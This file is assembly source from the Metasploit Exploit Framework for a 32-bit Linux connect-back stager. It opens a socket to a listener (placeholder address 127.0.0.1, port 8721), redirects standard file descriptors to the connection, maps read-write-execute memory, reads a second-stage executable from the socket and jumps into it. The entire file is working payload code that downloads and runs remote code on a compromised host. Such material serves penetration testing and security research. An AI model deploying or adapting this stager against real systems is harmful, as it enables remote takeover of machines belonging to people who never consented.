;#
;# Copyright (C) 2003 H D Moore / METASPLOIT.COM
;# Portions Copyright (C) 2003 Alexander Cuttergo
;#
;# This file is part of the Metasploit Exploit Framework.
;#

[BITS 32]

global _start

_start:

LSocket:
    ; socket(IP, AF_INET, SOCK_STREAM)
    mov ebp, esp
    xor eax, eax
    xor ebx, ebx
    inc ebx  
    push eax
    inc eax
    push eax
    inc eax
    push eax 
    mov ecx, esp
    mov byte al, 102
    int 0x80
     
LConnect:
    ; connect(fd, &sockaddr, 16)
    push 0x0100007F ; host: 127.0.0.1
    push 0x11220002 ; port: 8721 
    mov ecx, esp
    push byte 0x10
    push ecx
    push eax
    mov ecx, esp
    push eax
    xor eax, eax
    mov byte al, 102
    mov byte bl, 3
    int 0x80

    ; exit if the connection failed
    test eax, eax
    js LImpurity_Exit

LSetupDup:
    dec ebx
    mov ecx, ebx
    xor eax, eax
    pop ebx

LDup:
    mov al, 63
    int 0x80
    dec ecx
    jns LDup

LImpurity_Allocate
    mov edx, 0x12345678 ; payload size
    
    push ecx        ; offset
    push ecx        ; fd
    push byte 50    ; PRIVATE | ANONYMOUS | FIXED
    push byte 7     ; READ | WRITE | EXEC
    push 0x11223344 ; alloc size
    push 0x13370000 ; start address
    mov ebx, esp    ; _syscall6 syntax
    xor eax, eax    ; ------------------------------------
    mov al, 90      ; old_mmap()
	int	0x80        ; if this fails, its hopeless anyways

    
LImpurity_Prep:
    mov ecx, eax
    xor ebx, ebx


; The code below was adapted from the original Impurity
; bootcode.S and modified based on recommendations from
; Alexander.
    
LImpurity_Read:   
    mov eax, ebx
    mov al, 0x3
    int 0x80
    test eax, eax
    jle LImpurity_Exit
    
    sub edx, eax
    add ecx, eax
    test edx, edx
    jne LImpurity_Read
    
LImpurity_Exec:
    push edx            ; end of envp
    push edx            ; end of argv
    push esp            ; argv[0]
    inc edx
    push edx            ; argc = 1
    dec edx             ; ABI requires edx to be 0
    
    push 0x13370080     ; entry point to executable
    ret
    
LImpurity_Exit:
    push byte 1
    pop eax
    int 0x80
